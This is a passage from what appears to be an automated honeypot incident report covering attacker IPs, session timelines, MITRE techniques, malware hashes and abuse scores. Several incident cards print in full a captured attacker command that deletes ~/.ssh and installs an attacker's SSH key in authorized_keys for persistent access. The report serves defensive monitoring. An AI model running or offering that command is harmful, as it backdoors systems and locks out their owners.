| `2026-05-15 18:15:17` | `cowrie.command.failed` |
| `2026-05-15 18:15:17` | `cowrie.log.closed` |
| `2026-05-15 18:15:17` | `cowrie.session.params` |
| `2026-05-15 18:15:17` | `cowrie.command.input` |
| `2026-05-15 18:15:17` | `cowrie.session.file_download` |
| `2026-05-15 18:15:17` | `cowrie.log.closed` |
| `2026-05-15 18:15:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54819c6d4b4a

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:15 |
| **Last Seen** | 2026-05-15 18:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:15:19` | `cowrie.session.connect` |
| `2026-05-15 18:15:19` | `cowrie.client.version` |
| `2026-05-15 18:15:20` | `cowrie.client.kex` |
| `2026-05-15 18:15:20` | `cowrie.login.success` |
| `2026-05-15 18:15:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2f37260bdf5

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:16 |
| **Last Seen** | 2026-05-15 18:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:16:19` | `cowrie.session.connect` |
| `2026-05-15 18:16:19` | `cowrie.client.version` |
| `2026-05-15 18:16:19` | `cowrie.client.kex` |
| `2026-05-15 18:16:19` | `cowrie.login.success` |
| `2026-05-15 18:16:20` | `cowrie.session.params` |
| `2026-05-15 18:16:20` | `cowrie.command.input` |
| `2026-05-15 18:16:20` | `cowrie.command.failed` |
| `2026-05-15 18:16:20` | `cowrie.log.closed` |
| `2026-05-15 18:16:20` | `cowrie.session.params` |
| `2026-05-15 18:16:20` | `cowrie.command.input` |
| `2026-05-15 18:16:20` | `cowrie.session.file_download` |
| `2026-05-15 18:16:20` | `cowrie.log.closed` |
| `2026-05-15 18:16:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14424cfcbf04

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:16 |
| **Last Seen** | 2026-05-15 18:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:16:23` | `cowrie.session.connect` |
| `2026-05-15 18:16:23` | `cowrie.client.version` |
| `2026-05-15 18:16:23` | `cowrie.client.kex` |
| `2026-05-15 18:16:23` | `cowrie.login.success` |
| `2026-05-15 18:16:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-834b1d1dab9c

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:17 |
| **Last Seen** | 2026-05-15 18:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:17:24` | `cowrie.session.connect` |
| `2026-05-15 18:17:24` | `cowrie.client.version` |
| `2026-05-15 18:17:24` | `cowrie.client.kex` |
| `2026-05-15 18:17:24` | `cowrie.login.success` |
| `2026-05-15 18:17:25` | `cowrie.session.params` |
| `2026-05-15 18:17:25` | `cowrie.command.input` |
| `2026-05-15 18:17:25` | `cowrie.command.failed` |
| `2026-05-15 18:17:25` | `cowrie.log.closed` |
| `2026-05-15 18:17:25` | `cowrie.session.params` |
| `2026-05-15 18:17:25` | `cowrie.command.input` |
| `2026-05-15 18:17:25` | `cowrie.session.file_download` |
| `2026-05-15 18:17:25` | `cowrie.log.closed` |
| `2026-05-15 18:17:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b37d443768d6

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:17 |
| **Last Seen** | 2026-05-15 18:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:17:27` | `cowrie.session.connect` |
| `2026-05-15 18:17:27` | `cowrie.client.version` |
| `2026-05-15 18:17:28` | `cowrie.client.kex` |
| `2026-05-15 18:17:28` | `cowrie.login.success` |
| `2026-05-15 18:17:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69eba6c03970

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:18 |
| **Last Seen** | 2026-05-15 18:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:18:35` | `cowrie.session.connect` |
| `2026-05-15 18:18:35` | `cowrie.client.version` |
| `2026-05-15 18:18:35` | `cowrie.client.kex` |
| `2026-05-15 18:18:36` | `cowrie.login.success` |
| `2026-05-15 18:18:36` | `cowrie.session.params` |
| `2026-05-15 18:18:36` | `cowrie.command.input` |
| `2026-05-15 18:18:36` | `cowrie.command.failed` |
| `2026-05-15 18:18:37` | `cowrie.log.closed` |
| `2026-05-15 18:18:37` | `cowrie.session.params` |
| `2026-05-15 18:18:37` | `cowrie.command.input` |
| `2026-05-15 18:18:37` | `cowrie.session.file_download` |
| `2026-05-15 18:18:37` | `cowrie.log.closed` |
| `2026-05-15 18:18:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f91bae77d534

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:18 |
| **Last Seen** | 2026-05-15 18:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:18:39` | `cowrie.session.connect` |
| `2026-05-15 18:18:39` | `cowrie.client.version` |
| `2026-05-15 18:18:39` | `cowrie.client.kex` |
| `2026-05-15 18:18:40` | `cowrie.login.success` |
| `2026-05-15 18:18:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90013b272c85

| Field | Detail |
|---|---|
| **Source IP** | `103.174.115[.]72` |
| **First Seen** | 2026-05-15 18:30 |
| **Last Seen** | 2026-05-15 18:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:30:08` | `cowrie.session.connect` |
| `2026-05-15 18:30:08` | `cowrie.client.version` |
| `2026-05-15 18:30:08` | `cowrie.client.kex` |
| `2026-05-15 18:30:09` | `cowrie.login.success` |
| `2026-05-15 18:30:09` | `cowrie.session.params` |
| `2026-05-15 18:30:09` | `cowrie.command.input` |
| `2026-05-15 18:30:09` | `cowrie.command.failed` |
| `2026-05-15 18:30:10` | `cowrie.log.closed` |
| `2026-05-15 18:30:10` | `cowrie.session.params` |
| `2026-05-15 18:30:10` | `cowrie.command.input` |
| `2026-05-15 18:30:10` | `cowrie.session.file_download` |
| `2026-05-15 18:30:10` | `cowrie.log.closed` |
| `2026-05-15 18:30:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.115[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.174.115[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95e2cb418bbd

| Field | Detail |
|---|---|
| **Source IP** | `103.174.115[.]72` |
| **First Seen** | 2026-05-15 18:30 |
| **Last Seen** | 2026-05-15 18:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:30:13` | `cowrie.session.connect` |
| `2026-05-15 18:30:13` | `cowrie.client.version` |
| `2026-05-15 18:30:13` | `cowrie.client.kex` |
| `2026-05-15 18:30:14` | `cowrie.login.success` |
| `2026-05-15 18:30:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.115[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.174.115[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67478855faeb

| Field | Detail |
|---|---|
| **Source IP** | `43.134.188[.]32` |
| **First Seen** | 2026-05-15 19:13 |
| **Last Seen** | 2026-05-15 19:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 19:13:47` | `cowrie.session.connect` |
| `2026-05-15 19:13:47` | `cowrie.client.version` |
| `2026-05-15 19:13:47` | `cowrie.client.kex` |
| `2026-05-15 19:13:47` | `cowrie.login.success` |
| `2026-05-15 19:13:47` | `cowrie.session.params` |
| `2026-05-15 19:13:47` | `cowrie.command.input` |
| `2026-05-15 19:13:47` | `cowrie.command.failed` |
| `2026-05-15 19:13:47` | `cowrie.log.closed` |
| `2026-05-15 19:13:48` | `cowrie.session.params` |
| `2026-05-15 19:13:48` | `cowrie.command.input` |
| `2026-05-15 19:13:48` | `cowrie.session.file_download` |
| `2026-05-15 19:13:48` | `cowrie.log.closed` |
| `2026-05-15 19:13:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.188[.]32` to AbuseIPDB if not already reported
- [ ] Block `43.134.188[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fbfe874bbc0

| Field | Detail |
|---|---|
| **Source IP** | `43.134.188[.]32` |
| **First Seen** | 2026-05-15 19:13 |
| **Last Seen** | 2026-05-15 19:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 19:13:49` | `cowrie.session.connect` |
| `2026-05-15 19:13:49` | `cowrie.client.version` |
| `2026-05-15 19:13:49` | `cowrie.client.kex` |
| `2026-05-15 19:13:49` | `cowrie.login.success` |
| `2026-05-15 19:13:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.188[.]32` to AbuseIPDB if not already reported
- [ ] Block `43.134.188[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `51.68.226[.]87` | **15** | 2026-05-15 18:01 | 2026-05-15 18:18 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.38[.]35` | **14** | 2026-05-15 18:05 | 2026-05-15 18:08 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `159.203.20[.]239` | **9** | 2026-05-15 17:42 | 2026-05-15 19:32 | 6m | 0 | `T1592` | 🟢 LOW |
| `45.148.120[.]187` | **6** | 2026-05-15 18:12 | 2026-05-15 19:17 | 6m | 0 | `T1592` | 🟢 LOW |
| `138.197.147[.]76` | **4** | 2026-05-15 19:09 | 2026-05-15 19:23 | 2m | 0 | `T1592` | 🟢 LOW |
| `107.182.234[.]69` | **3** | 2026-05-15 17:50 | 2026-05-15 18:09 | 2m | 0 | `T1592` | 🟢 LOW |
| `90.82.78[.]124` | **3** | 2026-05-15 19:01 | 2026-05-15 19:01 | 2m | 0 | `T1592` | 🟢 LOW |
| `113.194.203[.]31` | **2** | 2026-05-15 18:02 | 2026-05-15 18:04 | 4m | 0 | `T1592` | 🟢 LOW |
| `20.118.202[.]209` | **2** | 2026-05-15 17:55 | 2026-05-15 17:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.174.115[.]72` | 1 | 2026-05-15 18:30 | 2026-05-15 18:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.13.239[.]146` | 1 | 2026-05-15 18:30 | 2026-05-15 18:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `138.121.113[.]159` | 1 | 2026-05-15 19:14 | 2026-05-15 19:14 | 12s | 0 | `T1592` | 🟢 LOW |
| `14.224.227[.]189` | 1 | 2026-05-15 17:59 | 2026-05-15 17:59 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.169[.]153` | 1 | 2026-05-15 18:00 | 2026-05-15 18:00 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-05-15 19:24 | 2026-05-15 19:24 | 10s | 0 | `T1592` | 🟢 LOW |
| `197.225.146[.]23` | 1 | 2026-05-15 17:58 | 2026-05-15 17:58 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `212.20.49[.]156` | 1 | 2026-05-15 19:00 | 2026-05-15 19:00 | 12s | 0 | `T1592` | 🟢 LOW |
| `46.236.65[.]235` | 1 | 2026-05-15 19:04 | 2026-05-15 19:05 | 13s | 0 | `T1592` | 🟢 LOW |
| `77.239.111[.]233` | 1 | 2026-05-15 17:57 | 2026-05-15 17:57 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `138.197.147[.]76` | CA | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `138.121.113[.]159` | AR | REFSA TELECOMUNICACIONES | **100** ⚠️ | 5 |
| `212.20.49[.]156` | RU | OJSC Sibirtelecom | **100** ⚠️ | 17 |
| `106.13.239[.]146` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 5 |
| `77.239.111[.]233` | NL | Amsterdam, Netherlands | **100** ⚠️ | 10 |
| `90.82.78[.]124` | GF | Orange Business Services | **100** ⚠️ | 10 |
| `223.123.38[.]35` | PK | CMPak Limited | **100** ⚠️ | 50 |
| `159.203.20[.]239` | CA | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `107.182.234[.]69` | US | Hosting Services, Inc. | **100** ⚠️ | 1 |
| `51.68.226[.]87` | FR | OVH SAS | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 64 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 37 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 27 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 19 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 19 |

---

## 🔕 False Positive Summary (21 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 11 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 9 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
